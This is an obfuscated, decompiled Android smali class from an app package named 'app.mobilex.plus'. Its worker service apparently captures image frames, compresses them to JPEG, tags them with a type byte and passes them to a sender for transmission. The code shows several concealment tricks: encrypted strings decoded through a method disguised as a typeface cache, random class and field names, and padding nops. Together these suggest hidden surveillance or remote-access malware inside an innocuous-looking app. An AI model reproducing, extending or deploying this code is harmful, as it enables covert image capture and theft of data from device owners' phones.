.class public final synthetic Lv/s/AbW0SZqZejvB;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/services/UtilAIWorker;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/AbW0SZqZejvB;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/AbW0SZqZejvB;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    .line 1
    iget v0, p0, Lv/s/AbW0SZqZejvB;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    const/4 v1, 0x0

    nop

    nop

    .line 4
    packed-switch v0, :pswitch_data_0

    .line 5
    .line 6
    .line 7
    iget-object v2, p0, Lv/s/AbW0SZqZejvB;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

    .line 8
    .line 9
    sget-boolean v0, Lapp/mobilex/plus/services/UtilAIWorker;->MLSIo1htfMPWeB8V876L:Z

    .line 10
    .line 11
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    .line 12
    .line 13
    iget v0, v2, Lapp/mobilex/plus/services/UtilAIWorker;->hjneShqpF9Tis4:I

    .line 14
    .line 15
    iget v4, v2, Lapp/mobilex/plus/services/UtilAIWorker;->gmNWMfvn6zlEj:I

    .line 16
    .line 17
    mul-int/2addr v0, v4

    .line 18
    div-int/lit8 v0, v0, 0x4

    .line 19
    .line 20
    invoke-direct {v3, v0}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    .line 21
    .line 22
    .line 23
    :cond_0
    :goto_0
    iget-boolean v0, v2, Lapp/mobilex/plus/services/UtilAIWorker;->pyu8ovAipBTLYAiKab:Z

    .line 24
    .line 25
    if-eqz v0, :cond_3

    .line 26
    .line 27
    :try_start_0
    iget-object v0, v2, Lapp/mobilex/plus/services/UtilAIWorker;->Qrz92kRPw4GcghAc:Ljava/util/concurrent/LinkedBlockingQueue;

    .line 28
    .line 29
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    .line 30
    .line 31
    const-wide/16 v5, 0x12c

    .line 32
    .line 33
    invoke-virtual {v0, v5, v6, v4}, Ljava/util/concurrent/LinkedBlockingQueue;->poll(JLjava/util/concurrent/TimeUnit;)Ljava/lang/Object;

    .line 34
    .line 35
    .line 36
    move-result-object v0

    nop

    nop

    .line 37
    move-object v5, v0

    .line 38
    check-cast v5, [B

    .line 39
    .line 40
    if-nez v5, :cond_1

    .line 41
    .line 42
    goto :goto_0

    .line 43
    :cond_1
    iget-object v0, v2, Lapp/mobilex/plus/services/UtilAIWorker;->wotphlvK9sPbXJ:Ljava/util/concurrent/atomic/AtomicBoolean;

    .line 44
    .line 45
    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    .line 46
    .line 47
    .line 48
    move-result v0

    .line 49
    if-nez v0, :cond_0

    nop

    nop

    .line 50
    .line 51
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->reset()V

    .line 52
    .line 53
    .line 54
    new-instance v4, Landroid/graphics/YuvImage;

    .line 55
    .line 56
    iget v7, v2, Lapp/mobilex/plus/services/UtilAIWorker;->hjneShqpF9Tis4:I

    .line 57
    .line 58
    iget v8, v2, Lapp/mobilex/plus/services/UtilAIWorker;->gmNWMfvn6zlEj:I

    .line 59
    .line 60
    const/16 v9, 0x0

    .line 61
    const v6, 0x11

    .line 62
    .line 63
    invoke-direct/range {v4 .. v9}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    .line 64
    .line 65
    .line 66
    new-instance v0, Landroid/graphics/Rect;

    .line 67
    .line 68
    iget v5, v2, Lapp/mobilex/plus/services/UtilAIWorker;->hjneShqpF9Tis4:I

    nop

    nop

    .line 69
    .line 70
    iget v6, v2, Lapp/mobilex/plus/services/UtilAIWorker;->gmNWMfvn6zlEj:I

    .line 71
    .line 72
    invoke-direct {v0, v1, v1, v5, v6}, Landroid/graphics/Rect;-><init>(IIII)V

    .line 73
    .line 74
    .line 75
    iget v5, v2, Lapp/mobilex/plus/services/UtilAIWorker;->xDyLpEZyrcKVe0:I

    .line 76
    .line 77
    invoke-virtual {v4, v0, v5, v3}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    .line 78
    .line 79
    .line 80
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    .line 81
    .line 82
    .line 83
    move-result-object v0

    .line 84
    array-length v4, v0

    .line 85
    const/16 v5, 0x1

    .line 86
    add-int/2addr v4, v5

    .line 87
    new-array v4, v4, [B

    .line 88
    .line 89
    const/16 v6, 0x10

    .line 90
    .line 91
    aput-byte v6, v4, v1

    .line 92
    .line 93
    array-length v6, v0

    .line 94
    invoke-static {v0, v1, v4, v5, v6}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 95
    .line 96
    .line 97
    sget-object v6, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    .line 98
    .line 99
    sget-object v6, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;

    .line 100
    .line 101
    if-eqz v6, :cond_2

    .line 102
    .line 103
    invoke-virtual {v6, v4}, Lv/s/RWY6BVSB0XxPbw;->nQilHWaqS401ZtR([B)Z

    .line 104
    .line 105
    .line 106
    move-result v4

    .line 107
    goto :goto_1

    .line 108
    :catch_0
    move-exception v0

    .line 109
    goto/16 :goto_2

    .line 110
    :cond_2
    move/from16 v4, v1

    .line 111
    :goto_1
    if-eqz v4, :cond_0

    nop

    .line 112
    .line 113
    iget v4, v2, Lapp/mobilex/plus/services/UtilAIWorker;->gIIiyi2ddlMDR0:I

    .line 114
    .line 115
    add-int/2addr v4, v5

    nop

    .line 116
    iput v4, v2, Lapp/mobilex/plus/services/UtilAIWorker;->gIIiyi2ddlMDR0:I

    .line 117
    .line 118
    if-ne v4, v5, :cond_0

    .line 119
    .line 120
    const-string v4, "0025007F0049009400E4008000D400B50022007B005E00B800E300BA00DC00B3006F0036"

    .line 121
    .line 122
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 123
    .line 124
    .line 125
    move-result-object v4

    .line 126
    array-length v0, v0

    .line 127
    new-instance v5, Ljava/lang/StringBuilder;

    .line 128
    .line 129
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 130
    .line 131
    .line 132
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 133
    .line 134
    .line 135
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 136
    .line 137
    .line 138
    const-string v0, "b"

    .line 139
    .line 140
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 141
    .line 142
    .line 143
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v0

    .line 147
    invoke-static {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->b1EoSIRjJHO5(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 148
    .line 149
    .line 150
    goto/16 :goto_0

    .line 151
    :goto_2
    iget-boolean v4, v2, Lapp/mobilex/plus/services/UtilAIWorker;->pyu8ovAipBTLYAiKab:Z

    .line 152
    .line 153
    if-eqz v4, :cond_0

    .line 154
    .line 155
    const-string v4, "001000730055008300F500AD008800E7"

    .line 156
    .line 157
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 158
    .line 159
    .line 160
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 161
    .line 162
    .line 163
    goto/16 :goto_0

    .line 164
    .line 165
    :cond_3
    iput-boolean v1, v2, Lapp/mobilex/plus/services/UtilAIWorker;->nQilHWaqS401ZtR:Z

    .line 166
    .line 167
    return-void

    .line 168
    :pswitch_0
    iget-object v0, p0, Lv/s/AbW0SZqZejvB;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

    .line 169
    .line 170
    sget-boolean v1, Lapp/mobilex/plus/services/UtilAIWorker;->MLSIo1htfMPWeB8V876L:Z

    .line 171
    .line 172
    invoke-virtual {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->ibVTtJUNfrGYbW()V

    .line 173
    .line 174
    .line 175
    return-void

    .line 176
    :pswitch_1
    iget-object v0, p0, Lv/s/AbW0SZqZejvB;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

    nop

    .line 177
    .line 178
    sget-boolean v1, Lapp/mobilex/plus/services/UtilAIWorker;->MLSIo1htfMPWeB8V876L:Z

    .line 179
    .line 180
    :try_start_1
    invoke-virtual {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->w9sT1Swbhx3hs()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 181
    .line 182
    .line 183
    goto :goto_3

    .line 184
    :catch_1
    move-exception v0

    .line 185
    const-string v1, "002C0060005E009500FC00BE00CB00E700060044006900A800C200E50092"

    .line 186
    .line 187
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 188
    .line 189
    .line 190
    move-result-object v1

    nop

    nop

    .line 191
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 192
    .line 193
    .line 194
    move-result-object v0

    .line 195
    new-instance v2, Ljava/lang/StringBuilder;

    .line 196
    .line 197
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 198
    .line 199
    .line 200
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 201
    .line 202
    .line 203
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 204
    .line 205
    .line 206
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 207
    .line 208
    .line 209
    move-result-object v0

    .line 210
    invoke-static {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->b1EoSIRjJHO5(Ljava/lang/String;)V

    .line 211
    .line 212
    .line 213
    :goto_3
    return-void

    .line 214
    :pswitch_2
    iget-object v0, p0, Lv/s/AbW0SZqZejvB;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/UtilAIWorker;

    .line 215
    .line 216
    iget-object v2, v0, Lapp/mobilex/plus/services/UtilAIWorker;->wotphlvK9sPbXJ:Ljava/util/concurrent/atomic/AtomicBoolean;

    nop

    .line 217
    .line 218
    :try_start_2
    invoke-virtual {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->w9sT1Swbhx3hs()V

    .line 219
    .line 220
    .line 221
    invoke-virtual {v2, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 222
    .line 223
    .line 224
    goto :goto_4

    .line 225
    :catch_2
    move-exception v0

    .line 226
    const-string v3, "003000610052009300F300B70092008200110044007400B500AA00FF"

    .line 227
    .line 228
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 229
    .line 230
    .line 231
    move-result-object v3

    .line 232
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 233
    .line 234
    .line 235
    move-result-object v0

    .line 236
    new-instance v4, Ljava/lang/StringBuilder;

    .line 237
    .line 238
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 239
    .line 240
    .line 241
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 242
    .line 243
    .line 244
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 245
    .line 246
    .line 247
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 248
    .line 249
    .line 250
    move-result-object v0

    .line 251
    invoke-static {v0}, Lapp/mobilex/plus/services/UtilAIWorker;->b1EoSIRjJHO5(Ljava/lang/String;)V

    .line 252
    .line 253
    .line 254
    invoke-virtual {v2, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    .line 255
    .line 256
    .line 257
    :goto_4
    return-void

    .line 258
    nop

    .line 259
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
